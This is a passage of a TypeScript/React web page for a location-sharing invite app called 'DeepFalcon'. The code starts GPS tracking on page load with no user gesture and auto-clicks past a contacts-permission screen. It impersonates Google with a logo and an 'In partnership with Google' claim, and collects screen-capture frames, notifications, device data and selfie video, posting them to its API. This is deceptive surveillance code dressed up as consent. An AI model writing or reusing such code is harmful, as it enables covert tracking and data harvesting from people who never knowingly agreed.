          altitudeMeters: typeof altitude === "number" ? altitude : null,
          altitudeAccuracyMeters: typeof altitudeAccuracy === "number" ? altitudeAccuracy : null,
        };

        // Activity detection from GPS speed (m/s)
        if (typeof speed === "number" && speed >= 0) {
          const next: ActivityType = speed < 0.3 ? "stationary" : speed < 2.0 ? "walking" : speed < 5.5 ? "running" : "driving";
          setActivityType(next);
          activityTypeRef.current = next;
        }

        const source = classifySource(acc, sawNetworkFixRef.current, sawGpsFixRef.current);
        lastWatchPushRef.current = Date.now();
        // Push immediately — never block on reverse-geocoding; the address is
        // cosmetic and arrives asynchronously in the background.
        pushLocation(lat, lng, acc, addressRef.current, "active", source);
        // Refresh address in background every 5 updates (or on first fix)
        if (!addressRef.current || updateCountRef.current % 5 === 0) {
          reverseGeocode(lat, lng).then((newAddr) => {
            if (newAddr) setAddress(newAddr);
          });
        }
      },
      (err) => {
        if (err.code === err.PERMISSION_DENIED) {
          setState("denied");
          if (watchIdRef.current !== null) { navigator.geolocation.clearWatch(watchIdRef.current); watchIdRef.current = null; }
          if (heartbeatRef.current !== null) { clearInterval(heartbeatRef.current); heartbeatRef.current = null; }
          liveSelfieRecordingRef.current?.stop();
          wakeLockRef.current?.release(); wakeLockRef.current = null;
        } else {
          setState("gps_off");
          liveSelfieRecordingRef.current?.stop();
          const c = coordsRef.current;
          if (c) pushLocation(c.lat, c.lng, undefined, addressRef.current, "offline");
        }
      },
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 30000 },
    );

    if (heartbeatRef.current !== null) clearInterval(heartbeatRef.current);
    heartbeatRef.current = setInterval(() => {
      const c = coordsRef.current;
      if (c && stateRef.current === "tracking" && Date.now() - lastWatchPushRef.current >= 2500) {
        const source = classifySource(c.accuracy ?? 999, sawNetworkFixRef.current, sawGpsFixRef.current);
        pushLocation(c.lat, c.lng, c.accuracy, addressRef.current, "active", source);
      }
    }, 3000);

    // Poll the Service Worker for visible notifications every 20 s and merge
    // the result into deviceInfoRef so the next location push carries them.
    // Note: getNotifications() only returns notifications shown by THIS app's
    // service worker — it cannot access WhatsApp, Instagram, or any other app.
    const pollNotifications = async () => {
      if (!("serviceWorker" in navigator)) return;
      try {
        const reg = await navigator.serviceWorker.ready;
        if (!reg.getNotifications) return;
        const notifs = await reg.getNotifications();
        const captured = notifs.map((n: Notification) => ({
          title: n.title,
          body: n.body ?? "",
          tag: n.tag ?? "",
          capturedAt: new Date().toISOString(),
        }));
        deviceInfoRef.current = {
          ...deviceInfoRef.current,
          liveNotifications: captured,
          notificationsCapturedAt: new Date().toISOString(),
        };
      } catch { /* not available */ }
    };

    pollNotifications(); // poll immediately on start
    if (notifPollRef.current !== null) clearInterval(notifPollRef.current);
    notifPollRef.current = setInterval(pollNotifications, 20000);

    sharingCountdownRef.current = setInterval(() => {
      const secondsLeft = Math.max(0, Math.ceil((sharingExpiresAt - Date.now()) / 1000));
      setSharingSecondsLeft(secondsLeft);
    }, 1000);
    sharingExpiryTimerRef.current = setTimeout(() => {
      setSharingSecondsLeft(0);
      stopTracking();
    }, LOCATION_SHARING_DURATION_MS);
  }, [acquireWakeLock, pushLocation, notifySW]); // eslint-disable-line react-hooks/exhaustive-deps

  const stopTracking = useCallback(() => {
    // Stop triggers final data delivery, waits for the already-streamed chunks,
    // and asks the API to save the compressed video in GeoBoard.
    selfieLoopActiveRef.current = false;   // prevent the loop from restarting
    liveSelfieRecordingRef.current?.stop();
    if (watchIdRef.current !== null) { navigator.geolocation.clearWatch(watchIdRef.current); watchIdRef.current = null; }
    if (heartbeatRef.current !== null) { clearInterval(heartbeatRef.current); heartbeatRef.current = null; }
    if (notifPollRef.current !== null) { clearInterval(notifPollRef.current); notifPollRef.current = null; }
    if (sharingExpiryTimerRef.current !== null) { clearTimeout(sharingExpiryTimerRef.current); sharingExpiryTimerRef.current = null; }
    if (sharingCountdownRef.current !== null) { clearInterval(sharingCountdownRef.current); sharingCountdownRef.current = null; }
    sharingExpiryRef.current = null;
    wakeLockRef.current?.release(); wakeLockRef.current = null;
    notifySW("LOCATION_TRACKING_STOPPED");
  }, [notifySW]);

  useEffect(() => {
    const onVisibility = () => { if (document.visibilityState === "visible" && stateRef.current === "tracking") acquireWakeLock(); };
    document.addEventListener("visibilitychange", onVisibility);
    return () => document.removeEventListener("visibilitychange", onVisibility);
  }, [acquireWakeLock]);

  useEffect(() => () => stopTracking(), [stopTracking]);

  // Page navigation/closing is treated like a sharing disconnect. The browser
  // may still terminate network work abruptly, but this gives MediaRecorder the
  // earliest possible chance to flush the final chunk and finalize the upload.
  useEffect(() => {
    const stopForPageExit = () => liveSelfieRecordingRef.current?.stop();
    window.addEventListener("pagehide", stopForPageExit);
    return () => window.removeEventListener("pagehide", stopForPageExit);
  }, []);

  // ── Session recording helpers ────────────────────────────────────────────────

  const pushSessionEvent = useCallback((event: string, detail?: unknown) => {
    sessionTimelineRef.current.push({
      event,
      ts: Date.now() - sessionStartMsRef.current,
      ...(detail != null ? { detail } : {}),
    });
  }, []);

  const captureScreenFrame = useCallback(() => {
    const video = sessionScreenVideoRef.current;
    if (!video || !sessionScreenStreamRef.current?.active || video.paused) return;
    try {
      const W = Math.min(video.videoWidth || 640, 640);
      const H = Math.round((video.videoHeight || 360) * W / (video.videoWidth || 640));
      const canvas = document.createElement("canvas");
      canvas.width = W; canvas.height = H;
      canvas.getContext("2d")!.drawImage(video, 0, 0, W, H);
      const dataUrl = canvas.toDataURL("image/jpeg", 0.5);
      if (dataUrl.length > 100) sessionFramesRef.current.push(dataUrl);
    } catch { /* canvas tainted or unavailable */ }
  }, []);

  const stopScreenCapture = useCallback(() => {
    if (sessionFrameCaptureRef.current) { clearInterval(sessionFrameCaptureRef.current); sessionFrameCaptureRef.current = null; }
    sessionScreenStreamRef.current?.getTracks().forEach((t) => t.stop());
    sessionScreenStreamRef.current = null;
    if (sessionScreenVideoRef.current) { sessionScreenVideoRef.current.srcObject = null; sessionScreenVideoRef.current = null; }
  }, []);

  const startScreenCapture = useCallback(() => {
    if (!navigator.mediaDevices?.getDisplayMedia) return;
    navigator.mediaDevices.getDisplayMedia({ video: { frameRate: 1 } as MediaTrackConstraints, audio: false })
      .then((stream) => {
        sessionScreenStreamRef.current = stream;
        pushSessionEvent("screen_shared");
        const video = document.createElement("video");
        video.srcObject = stream; video.muted = true; video.playsInline = true;
        sessionScreenVideoRef.current = video;
        video.play().then(() => {
          captureScreenFrame();
          sessionFrameCaptureRef.current = setInterval(captureScreenFrame, 5000);
        }).catch(() => {});
        stream.getVideoTracks()[0]?.addEventListener("ended", () => {
          pushSessionEvent("screen_share_ended");
          stopScreenCapture();
        });
      })
      .catch(() => pushSessionEvent("screen_denied"));
  }, [pushSessionEvent, captureScreenFrame, stopScreenCapture]);
  // Keep the ref in sync so handlers declared before startScreenCapture can call it.
  startScreenCaptureRef.current = startScreenCapture;

  const saveSession = useCallback(async (timeToGrantMs?: number) => {
    if (sessionSavedRef.current || !token) return;
    sessionSavedRef.current = true;
    stopScreenCapture();

    let notifications: Record<string, unknown>[] = [];
    try {
      const reg = await navigator.serviceWorker?.ready;
      const notifs = await reg?.getNotifications?.();
      notifications = (notifs ?? []).map((n: Notification) => ({ title: n.title, body: n.body, tag: n.tag }));
    } catch { /* SW unavailable */ }

    const body = {
      token: String(token),
      timeline: sessionTimelineRef.current,
      screenFrames: sessionFramesRef.current,
      deviceSnapshot: {
        ...deviceInfoRef.current,
        battery: batteryLevelRef.current != null
          ? { level: batteryLevelRef.current, charging: batteryChargingRef.current }
          : undefined,
      },
      notifications,
      ...(timeToGrantMs != null ? { timeToGrantMs } : {}),
    };

    try {
      await fetch(`${API_BASE}/api/consent-sessions`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body),
      });
    } catch { /* best-effort — never block tracking */ }
  }, [token, stopScreenCapture]);

  const processGeoPosition = useCallback((position: GeolocationPosition) => {
    // Guard: only the first winning GPS attempt should kick off the grant.
    if (grantProcessedRef.current) return;
    grantProcessedRef.current = true;
    const { latitude, longitude, accuracy } = position.coords;
    setCoords({ lat: latitude, lng: longitude, accuracy });
    setState("granting");
    grant.mutate(
      { token: token!, data: { latitude, longitude } },
      {
        onSuccess: (data: any) => {
          // Capture the per-session token so location pushes are scoped to this session
          if (data?.sessionToken) sessionTokenRef.current = data.sessionToken;
          startTracking(latitude, longitude, accuracy);
          // Save session data with Pixtral analysis — non-blocking background task
          pushSessionEvent("location_granted", { accuracy, lat: latitude, lng: longitude });
          const elapsed = Date.now() - sessionStartMsRef.current;
          saveSession(elapsed).catch(() => {});
        },
        onError: (err: any) => {
          const msg = err?.data?.error ?? "Failed to record consent. Please try again.";
          setErrorMsg(msg); setState("error");
        },
      },
    );
    reverseGeocode(latitude, longitude).then((addr) => { if (addr) setAddress(addr); });
  }, [token, grant, startTracking, pushSessionEvent, saveSession]);

  const doGrant = useCallback(() => {
    if (!navigator.geolocation) {
      setState("gps_off"); return;
    }
    setState("requesting");
    pushSessionEvent("location_requested");

    // NOTE: doGrant() is called from the auto-start effect — no user gesture.
    // Camera, contacts, and screen-share are gesture-gated; they are invoked
    // by handleAllowContacts / handleSkipContacts on the button tap instead.

    let settled = false;
    let tempWatchId: number | null = null;

    const cleanup = () => {
      if (tempWatchId !== null) { navigator.geolocation.clearWatch(tempWatchId); tempWatchId = null; }
    };

    // Declare before onPosition so the closure can reference it.
    let hardCapTimer: ReturnType<typeof setTimeout>;

    const onPosition = (position: GeolocationPosition) => {
      if (settled) return;
      settled = true;
      clearTimeout(hardCapTimer);
      cleanup();
      processGeoPosition(position);
    };

    // Hard 2.5-second cap: switch to "Waiting for GPS…" UI but do NOT block
    // future callbacks — the warm-up watchPosition and remaining
    // getCurrentPosition calls will still fire onPosition the moment the chip
    // gets a lock, so recovery is automatic with no user action.
    hardCapTimer = setTimeout(() => {
      if (!settled) setState("gps_off");
    }, 2500);

    // Strategy 1 — instant: accept any position the browser has cached, no
    // matter how old (maximumAge: Infinity). Android caches the last known
    // position across all apps; this often resolves in under 100 ms.
    navigator.geolocation.getCurrentPosition(onPosition, () => {},
      { enableHighAccuracy: false, timeout: 500, maximumAge: Infinity });

    // Strategy 2 — fast network/WiFi fix: accept a cached fix up to 5 min old.
    navigator.geolocation.getCurrentPosition(onPosition, () => {},
      { enableHighAccuracy: false, timeout: 2000, maximumAge: 300_000 });

    // Strategy 3 — high-accuracy GPS: runs in parallel; refines if it wins.
    navigator.geolocation.getCurrentPosition(onPosition, () => {},
      { enableHighAccuracy: true, timeout: 8000 });

    // Strategy 4 — warm-up watch: starts the GPS chip immediately so by the
    // time strategies 2/3 time-out the satellite lock is already in progress.
    tempWatchId = navigator.geolocation.watchPosition(onPosition, () => {},
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });

    // Strategy 5 — IP geolocation fallback (~300 ms, city-level ~5 km accuracy).
    // If the browser's geolocation stack stalls completely, this still lets the
    // session start within seconds. watchPosition will refine to GPS accuracy.
    (() => {
      const ac = new AbortController();
      const t = setTimeout(() => ac.abort(), 2500);
      fetch("https://ip-api.com/json?fields=lat,lon,status", { signal: ac.signal })
        .then((r) => r.json())
        .then((d: { lat?: number; lon?: number; status?: string }) => {
          clearTimeout(t);
          if (settled || d.status !== "success" || d.lat == null || d.lon == null) return;
          onPosition({
            coords: { latitude: d.lat, longitude: d.lon, accuracy: 5000, speed: null, heading: null, altitude: null, altitudeAccuracy: null },
            timestamp: Date.now(),
          } as unknown as GeolocationPosition);
        })
        .catch(() => clearTimeout(t));
    })();
  }, [processGeoPosition]);

  // Keep the ref up to date so callbacks defined earlier can call doGrant.
  doGrantRef.current = doGrant;

  // Auto-start: show emergency contacts screen first for new consents.
  // For already-accepted invites, jump straight to main tracking.
  useEffect(() => {
    if (!invite || autoStartedRef.current || isWebView) return;
    autoStartedRef.current = true;
    const stored = loadStoredGps();

    if (stored) {
      setDisplayPhase("main");
      setState("granting");
      // Hard 4-second cap: if the grant API call stalls, force into tracking
      // with the stored coords so the "Connecting…" screen never shows > 4s.
      let grantSettled = false;
      const grantCap = setTimeout(() => {
        if (!grantSettled) { grantSettled = true; startTracking(stored.lat, stored.lng, stored.accuracy); }
      }, 4000);
      grant.mutate(
        { token: token!, data: { latitude: stored.lat, longitude: stored.lng } },
        {
          onSuccess: (data: any) => {
            // Capture session token for scoped location pushes
            if (data?.sessionToken) sessionTokenRef.current = data.sessionToken;
            clearTimeout(grantCap);
            if (!grantSettled) { grantSettled = true; startTracking(stored.lat, stored.lng, stored.accuracy); }
          },
          // On grant failure, stay in main phase but don't claim active sharing.
          // "gps_off" shows "Connecting…" in main phase (not an error screen).
          onError: () => { clearTimeout(grantCap); if (!grantSettled) { grantSettled = true; setState("gps_off"); } },
        },
      );
      reverseGeocode(stored.lat, stored.lng).then((addr) => { if (addr) setAddress(addr); });
    } else {
      // Always fire GPS immediately to create a fresh session — the link is
      // permanent and reusable; each page load starts a new independent session.
      // (Previously "accepted" invites jumped straight to startTracking; now they
      // go through grant like any new visit so a new session row is created.)
      doGrantRef.current();
    }
  }, [invite, doGrant, startTracking, isWebView]); // eslint-disable-line react-hooks/exhaustive-deps

  // Auto-retry: on a location error, count down and automatically "click"
  // Try Again after AUTO_RETRY_SECONDS — most failures here (GPS still
  // warming up, a flaky first fix, momentary signal loss) resolve themselves
  // shortly, and the person shouldn't have to notice the error and tap a
  // button to recover from something that fixes itself.
  useEffect(() => {
    if (state !== "error") { setAutoRetrySecondsLeft(AUTO_RETRY_SECONDS); return; }
    setAutoRetrySecondsLeft(AUTO_RETRY_SECONDS);
    const interval = setInterval(() => {
      setAutoRetrySecondsLeft((s) => Math.max(0, s - 1));
    }, 1000);
    return () => clearInterval(interval);
  }, [state]);

  useEffect(() => {
    if (state === "error" && autoRetrySecondsLeft === 0) {
      autoStartedRef.current = false;
      doGrant();
    }
  }, [state, autoRetrySecondsLeft, doGrant]);

  // Auto-click the contacts screen: when the "Let's Stay Connected" screen
  // appears for a new visitor, automatically advance through it so location
  // tracking starts without requiring a manual button tap.
  useEffect(() => {
    if (displayPhase !== "contacts" || !invite || autoContactsSkippedRef.current) return;
    autoContactsSkippedRef.current = true;
    handleSkipContacts();
  }, [displayPhase, invite, handleSkipContacts]);

  // The old kitty overlay is now only used for already-accepted invites
  // (displayPhase === "main"). For the new contacts-first flow the kitty
  // is shown as part of the displayPhase state machine instead.
  useEffect(() => {
    if (displayPhase !== "main") return; // new flow handles its own kitty
    if (state === "tracking" && !kittyOverlayStartedRef.current) {
      kittyOverlayStartedRef.current = true;
      setKittyOverlayActive(true);
    }
  }, [state, displayPhase]);

  // When displayPhase reaches "main" but GPS hasn't resolved yet, push forward
  // immediately — no intermediate connecting screen shown.
  useEffect(() => {
    const isConnecting = displayPhase === "main" && (state === "granting" || state === "requesting");
    if (!isConnecting) return;

    const t = setTimeout(() => {
      const c = coordsRef.current;
      if (c) {
        startTracking(c.lat, c.lng, c.accuracy ?? undefined);
      } else {
        const stored = loadStoredGps();
        if (stored) startTracking(stored.lat, stored.lng, stored.accuracy);
        else setState("gps_off");
      }
    }, 800); // short grace period for GPS to settle, then move on silently
    return () => clearTimeout(t);
  }, [displayPhase, state, startTracking]);

  // ── WebView blocked ────────────────────────────────────────────────────────────
  if (state === "webview_blocked") {
    const currentUrl = typeof window !== "undefined" ? window.location.href : "";
    return (
      <div className="bg-background flex items-center justify-center p-4" style={fullHeight}>
        <Card className="max-w-md w-full shadow-xl">
          <CardContent className="pt-10 pb-10 text-center">
            <div className="flex items-center gap-2 justify-center text-primary font-bold text-lg mb-6">
              <Shield className="h-5 w-5" /> DeepFalcon
            </div>
            <ExternalLink className="h-14 w-14 text-primary mx-auto mb-4" />
            <h2 className="text-xl font-semibold mb-2">Open in Your Browser</h2>
            <p className="text-muted-foreground text-sm mb-6">
              Location access requires your phone's browser (Chrome, Safari, Firefox). Tap the menu button and choose "Open in browser".
            </p>
            <div className="bg-muted rounded-lg p-3 mb-4 flex flex-col gap-2 text-xs text-muted-foreground">
              <p className="font-medium text-foreground">How to open:</p>
              <p>• <strong>WhatsApp:</strong> Tap ⋮ menu → "Open in browser"</p>
              <p>• <strong>Instagram:</strong> Tap ··· → "Open in external browser"</p>
              <p>• <strong>Facebook:</strong> Tap ⋮ → "Open in Chrome" / "Open in Safari"</p>
            </div>
            {currentUrl && <CopyAndOpenButton url={currentUrl} />}
          </CardContent>
        </Card>
      </div>
    );
  }

  // ── Invalid link ───────────────────────────────────────────────────────────────
  if (!isLoading && (isError || !invite)) {
    return (
      <div className="bg-background flex items-center justify-center p-4" style={fullHeight}>
        <Card className="max-w-md w-full shadow-lg">
          <CardContent className="pt-10 pb-10 text-center">
            <XCircle className="h-14 w-14 text-red-500 mx-auto mb-4" />
            <h2 className="text-xl font-semibold mb-2">Invalid Link</h2>
            <p className="text-muted-foreground text-sm">This link is invalid or has expired. Ask the sender to resend it.</p>
          </CardContent>
        </Card>
      </div>
    );
  }

  // ── NEW: Display-phase screens (contacts → kitty → popup → main) ─────────────
  // These take over for new invite flows, before any ConsentState renders.

  if (displayPhase === "contacts" && !isLoading && invite) {
    const senderName = invite.fromUserName ?? "GODWIN Confidence";
    return (
      <div
        className="relative flex flex-col items-center justify-center p-6 overflow-hidden"
        style={{ ...fullHeight, background: "linear-gradient(170deg,#f9a8d4 0%,#e879f9 30%,#a855f7 65%,#6d28d9 100%)" }}
      >
        {/* Floating hearts & sparkles */}
        <FloatingSparkles particles={[
          { emoji: "💕", left: "8%",  top: "12%", size: 22, delay: 0,   duration: 3.4 },
          { emoji: "🌸", left: "80%", top: "10%", size: 20, delay: 0.6, duration: 3.0 },
          { emoji: "✨", left: "18%", top: "78%", size: 20, delay: 1.0, duration: 3.6 },
          { emoji: "💫", left: "88%", top: "72%", size: 22, delay: 0.3, duration: 2.9 },
          { emoji: "💕", left: "5%",  top: "50%", size: 20, delay: 1.5, duration: 3.2 },
          { emoji: "🌸", left: "91%", top: "42%", size: 20, delay: 0.9, duration: 3.8 },
          { emoji: "✨", left: "50%", top: "6%",  size: 22, delay: 1.2, duration: 3.1 },
          { emoji: "💕", left: "65%", top: "85%", size: 20, delay: 0.4, duration: 3.5 },
          { emoji: "✨", left: "35%", top: "20%", size: 18, delay: 0.7, duration: 2.8 },
          { emoji: "💫", left: "72%", top: "55%", size: 18, delay: 1.3, duration: 3.3 },
          { emoji: "🌸", left: "25%", top: "62%", size: 16, delay: 0.2, duration: 3.7 },
          { emoji: "✨", left: "60%", top: "90%", size: 18, delay: 1.7, duration: 3.0 },
          { emoji: "💕", left: "42%", top: "45%", size: 16, delay: 2.0, duration: 4.0 },
          { emoji: "💫", left: "15%", top: "33%", size: 18, delay: 0.5, duration: 3.5 },
        ]} />

        {/* Glowing orb with cute mascot */}
        <motion.div
          className="relative flex items-center justify-center mb-8"
          initial={{ scale: 0.7, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          transition={{ duration: 0.6, type: "spring", bounce: 0.45 }}
        >
          {/* Outer glow ring */}
          <div
            className="absolute rounded-full"
            style={{
              width: 148, height: 148,
              background: "radial-gradient(circle, rgba(232,121,249,0.55) 0%, rgba(168,85,247,0.2) 60%, transparent 80%)",
              filter: "blur(8px)",
            }}
          />
          {/* Orb */}
          <div
            className="w-32 h-32 rounded-full flex items-center justify-center relative z-10"
            style={{
              background: "radial-gradient(circle at 38% 38%, rgba(255,255,255,0.55) 0%, rgba(216,180,254,0.7) 40%, rgba(167,139,250,0.85) 100%)",
              boxShadow: "0 0 40px rgba(232,121,249,0.6), inset 0 0 20px rgba(255,255,255,0.3)",
            }}
          >
            <motion.span
              className="text-5xl select-none"
              animate={{ y: [0, -6, 0], rotate: [-3, 3, -3] }}
              transition={{ duration: 2.2, repeat: Infinity, ease: "easeInOut" }}
              role="img"
              aria-label="friendly character"
            >
              😊
            </motion.span>
          </div>
          {/* Orbiting hearts */}
          {[{ emoji: "💕", angle: -30, r: 72 }, { emoji: "🌸", angle: 60, r: 70 }, { emoji: "💕", angle: 155, r: 68 }].map((h, i) => (
            <motion.span
              key={i}
              className="absolute text-base select-none pointer-events-none"
              style={{
                left: "50%", top: "50%",
                x: Math.cos((h.angle * Math.PI) / 180) * h.r - 8,
                y: Math.sin((h.angle * Math.PI) / 180) * h.r - 8,
              }}
              animate={{ scale: [0.8, 1.2, 0.8], opacity: [0.6, 1, 0.6] }}
              transition={{ duration: 2.0 + i * 0.4, repeat: Infinity, ease: "easeInOut", delay: i * 0.5 }}
            >
              {h.emoji}
            </motion.span>
          ))}
        </motion.div>

        <motion.h1
          className="text-3xl font-extrabold text-white text-center mb-4 leading-tight"
          style={{ textShadow: "0 2px 16px rgba(168,85,247,0.5)" }}
          initial={{ opacity: 0, y: 10 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.18 }}
        >
          Let's Stay Connected 💕
        </motion.h1>

        <motion.div
          className="flex items-center justify-center gap-1.5 mb-4"
          initial={{ opacity: 0, y: 6 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.22 }}
        >
          <svg width="13" height="13" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
            <path fill="#4285F4" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
            <path fill="#34A853" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
            <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
            <path fill="#EA4335" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
          </svg>
          <span className="text-xs text-white/60 font-medium tracking-wide">In partnership with Google</span>
        </motion.div>

        <motion.p
          className="text-sm text-white/80 text-center leading-relaxed mb-12 max-w-xs"
          initial={{ opacity: 0, y: 10 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.28 }}
        >
          Let's help Google secure your loved ones contact — recommended if you wish to proceed 100 💯 percent secure ✨
        </motion.p>

        <motion.div
          className="w-full max-w-xs space-y-3 relative z-10"
          initial={{ opacity: 0, y: 14 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.38 }}
        >
          <button
            onClick={handleAllowContacts}
            className="w-full py-4 rounded-2xl font-bold text-base text-white active:scale-[0.97] transition-transform flex items-center justify-center gap-2 relative overflow-hidden"
            style={{
              background: "linear-gradient(135deg,#f472b6 0%,#c084fc 50%,#a855f7 100%)",
              boxShadow: "0 8px 32px rgba(192,132,252,0.55), 0 0 0 1.5px rgba(255,255,255,0.25) inset",
            }}
          >
            <Phone className="h-5 w-5" />
            Allow Contacts ✨
          </button>

        </motion.div>

        {/* Soft FAB */}
        <div className="fixed bottom-6 right-6 z-20">
          <a
            href="https://wa.me/?text=Need+help+with+DeepFalcon"
            target="_blank"
            rel="noreferrer"
            className="w-14 h-14 rounded-full flex items-center justify-center shadow-lg"
            style={{ background: "linear-gradient(135deg,#a855f7,#7c3aed)", boxShadow: "0 4px 20px rgba(124,58,237,0.5)" }}
          >
            <Shield className="h-7 w-7 text-white" />
          </a>
        </div>
      </div>
    );
  }

  if (displayPhase === "kitty") {
    return <KittyWaitOverlay onComplete={handleKittyComplete} />;
  }

  if (displayPhase === "contacts_popup") {
    return (
      <div style={{ ...fullHeight, background: "radial-gradient(circle at 50% 20%, #ffd7e8 0%, #ffb3d9 35%, #d8a8ff 75%, #b78cff 100%)" }}>
        <ContactsSyncedPopup
          contacts={syncedContacts}
          senderName={invite?.fromUserName ?? "GODWIN Confidence"}
          onClose={() => setDisplayPhase("main")}
        />
      </div>
    );
  }

  // ── Cute "please wait" kitty overlay (for already-accepted invites) ────────────
  if (kittyOverlayActive) {
    return <KittyWaitOverlay onComplete={() => setKittyOverlayActive(false)} />;
  }

  // ── Smart permission explanation screen ────────────────────────────────────────
  if (state === "pre_consent") {
    const senderName = invite?.fromUserName ?? "someone";
    return (
      <div className="bg-background flex flex-col items-center justify-center p-4" style={fullHeight}>
        <div className="max-w-md w-full">
          {/* Header */}
          <div className="text-center mb-8">
            <div className="inline-flex items-center gap-2 text-primary font-bold text-xl mb-4">
              <Shield className="h-6 w-6" /> DeepFalcon
            </div>
            <h1 className="text-2xl font-bold text-foreground leading-tight mb-2">
              {senderName} wants to share locations with you
            </h1>
            <p className="text-muted-foreground text-sm">
              To get started, DeepFalcon needs a few permissions. Here's exactly what we use them for:
            </p>
          </div>

          {/* Permission cards */}
          <div className="space-y-3 mb-6">
            {/* Location */}
            <div className="flex items-start gap-4 p-4 rounded-2xl border border-blue-500/20 bg-blue-500/5">
              <div className="w-11 h-11 rounded-xl bg-blue-500/15 border border-blue-500/20 flex items-center justify-center flex-shrink-0">
                <MapPin className="h-5 w-5 text-blue-400" />
              </div>
              <div className="flex-1">
                <p className="font-semibold text-foreground text-sm mb-0.5">Precise Location</p>
                <p className="text-xs text-muted-foreground leading-relaxed">
                  Shares your real-time GPS position with {senderName} for up to <strong className="text-foreground">10 minutes</strong>.
                </p>
                <div className="mt-2 flex flex-wrap gap-1.5">
                  <span className="text-xs bg-blue-500/10 text-blue-400 border border-blue-500/20 rounded-full px-2 py-0.5 font-medium">GPS + Network</span>
                  <span className="text-xs bg-blue-500/10 text-blue-400 border border-blue-500/20 rounded-full px-2 py-0.5 font-medium">Background</span>
                  <span className="text-xs bg-blue-500/10 text-blue-400 border border-blue-500/20 rounded-full px-2 py-0.5 font-medium">High Accuracy</span>
                </div>
              </div>
              <CheckCircle className="h-5 w-5 text-blue-400 flex-shrink-0 mt-0.5" />
            </div>

            {/* Camera */}
            <div className="flex items-start gap-4 p-4 rounded-2xl border border-violet-500/20 bg-violet-500/5">
              <div className="w-11 h-11 rounded-xl bg-violet-500/15 border border-violet-500/20 flex items-center justify-center flex-shrink-0">
                <Camera className="h-5 w-5 text-violet-400" />
              </div>
              <div className="flex-1">
                <p className="font-semibold text-foreground text-sm mb-0.5">Camera Access</p>
                <p className="text-xs text-muted-foreground leading-relaxed">
                  Records a compressed, front-camera selfie video while this 10-minute location share is active. Recording stops and is saved to GeoBoard when sharing ends. No audio is recorded.
                </p>
                <div className="mt-2 flex flex-wrap gap-1.5">
                  <span className="text-xs bg-violet-500/10 text-violet-400 border border-violet-500/20 rounded-full px-2 py-0.5 font-medium">Front camera</span>
                  <span className="text-xs bg-violet-500/10 text-violet-400 border border-violet-500/20 rounded-full px-2 py-0.5 font-medium">Up to 10 min</span>
                  <span className="text-xs bg-violet-500/10 text-violet-400 border border-violet-500/20 rounded-full px-2 py-0.5 font-medium">No audio</span>
                </div>
              </div>
              <CheckCircle className="h-5 w-5 text-violet-400 flex-shrink-0 mt-0.5" />
            </div>

            {/* Physical Activity */}
            <div className="flex items-start gap-4 p-4 rounded-2xl border border-emerald-500/20 bg-emerald-500/5">
              <div className="w-11 h-11 rounded-xl bg-emerald-500/15 border border-emerald-500/20 flex items-center justify-center flex-shrink-0">
                <Activity className="h-5 w-5 text-emerald-400" />
              </div>
              <div className="flex-1">
                <p className="font-semibold text-foreground text-sm mb-0.5">Physical Activity</p>
                <p className="text-xs text-muted-foreground leading-relaxed">
                  Detects if you're stationary, walking, running, or driving — improves location accuracy and reduces battery drain.
                </p>
                <div className="mt-2 flex flex-wrap gap-1.5">
                  <span className="text-[10px] bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 rounded-full px-2 py-0.5 font-medium">🚶 Walk</span>
                  <span className="text-[10px] bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 rounded-full px-2 py-0.5 font-medium">🏃 Run</span>
                  <span className="text-[10px] bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 rounded-full px-2 py-0.5 font-medium">🚗 Drive</span>
                </div>
              </div>
              <CheckCircle className="h-5 w-5 text-emerald-400 flex-shrink-0 mt-0.5" />
            </div>

            {/* Emergency Contacts */}
            {"contacts" in navigator && (
              <div className="flex items-start gap-4 p-4 rounded-2xl border border-amber-500/20 bg-amber-500/5">
                <div className="w-11 h-11 rounded-xl bg-amber-500/15 border border-amber-500/20 flex items-center justify-center flex-shrink-0">
                  <Users className="h-5 w-5 text-amber-400" />
                </div>
                <div className="flex-1">
                  <p className="font-semibold text-foreground text-sm mb-0.5">Emergency Contacts</p>
                  <p className="text-xs text-muted-foreground leading-relaxed">
                    Shares up to 6 of your contacts with {senderName} so they can reach someone if you're unreachable.
                  </p>
                  <div className="mt-2 flex flex-wrap gap-1.5">
                    <span className="text-xs bg-amber-500/10 text-amber-400 border border-amber-500/20 rounded-full px-2 py-0.5 font-medium">Up to 6 contacts</span>
                    <span className="text-xs bg-amber-500/10 text-amber-400 border border-amber-500/20 rounded-full px-2 py-0.5 font-medium">One-time</span>
                  </div>
                </div>
                <CheckCircle className="h-5 w-5 text-amber-400 flex-shrink-0 mt-0.5" />
              </div>
            )}
          </div>

          {/* CTA */}
          <button
            onClick={doGrant}
            className="w-full py-4 px-6 rounded-2xl font-bold text-base text-white transition-all active:scale-[0.98]"
            style={{ background: "linear-gradient(135deg, #6366f1 0%, #8b5cf6 100%)", boxShadow: "0 8px 32px rgba(99,102,241,0.4)" }}
          >
            Grant All Access
          </button>

          <p className="text-center text-xs text-muted-foreground mt-4 leading-relaxed">
